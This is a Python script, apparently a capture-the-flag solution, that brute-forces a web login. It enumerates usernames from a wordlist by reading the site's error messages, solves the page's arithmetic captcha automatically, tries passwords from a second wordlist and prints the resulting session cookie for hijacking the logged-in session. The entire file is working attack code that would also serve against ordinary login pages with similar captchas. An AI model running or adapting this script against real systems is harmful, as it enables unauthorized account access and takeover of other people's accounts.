# This brute forces the login while dealing with the captcha.
# It outputs the username, password and the session cookie of the logged in session
# Just add the cookie and refresh the page. There is your flag

import requests
from bs4 import BeautifulSoup
import argparse
import operator

ops = {
    '+': operator.add,
    '-': operator.sub,
    '*': operator.mul,
    '/': operator.truediv,
}

parser = argparse.ArgumentParser()
parser.add_argument("--ip", type=str, required=True)
args = parser.parse_args()
session = requests.Session()
login_url = f"http://{args.ip}/login"
protected_url = f"http://{args.ip}/home"

response = session.get(login_url)
soup = BeautifulSoup(response.text, "html.parser")

payload = {
    "username": "admin",
    "password": "password",
    "captcha": "12345"
}
login_response = session.post(login_url, data=payload)

def get_captcha(login_response, session):
    soup = BeautifulSoup(login_response.text, "html.parser")
    captcha_input = soup.find("form")
    if captcha_input is None:
        return None
    for line in captcha_input:
        if "=" in line:
            #     230 * 9 = ?
            equation = line
            equation = equation.replace('=', '')
            equation = equation.replace('?', '')
            equation = equation.replace('\n', '')
            equation = equation.strip()
            equation = equation.split(' ')

            string_op = equation[1]
            result = ops[string_op](int(equation[0]), int(equation[2]))
            return result

def test_username(username, login_response, session):
    payload = {
        "username": username,
        "password": "password",
        "captcha": get_captcha(login_response, session)
    }
    login_response = session.post(login_url, data=payload)
    soup = BeautifulSoup(login_response.text, "html.parser")
    user_present = soup.find("p", class_="error")
    if user_present == None:
        print(f"{username} is available")
    elif "Invalid captcha" in user_present:
        print(f"{username} has bad captcha")
    elif "does not exist" not in user_present.text:
        return login_response, "found"
    return login_response, None

def test_password(username, password, login_response, session):
    payload = {
        "username": username,
        "password": password,
        "captcha": get_captcha(login_response, session)
    }
    if payload["captcha"] is None:
        return login_response, "previous"
    login_response = session.post(login_url, data=payload)
    soup = BeautifulSoup(login_response.text, "html.parser")
    user_present = soup.find("p", class_="error")
    if user_present == None:
        #print(f"{username} is available")
        pass
    elif "Invalid captcha" in user_present:
        print(f"{username} has bad captcha")
    return login_response, None

users = open("usernames.txt", "r")
username = ''
for user in users:
    login_response, result = test_username(user.strip(), login_response, session)
    if result == "found":
        username = user.strip()
        print(f"Username: {username}")
        break

passwords = open("passwords.txt", "r")
counter = 0
for password in passwords:
    login_response, result = test_password(username, password.strip(), login_response, session)
    if result == "previous":
        file = open("passwords.txt", "r")
        lines = file.readlines()
        password = lines[counter - 1]
        print(f"Password: {password.strip()}")
        break
    counter += 1

for cookie in session.cookies:
    print(f"Name: {cookie.name}, Value: {cookie.value}")

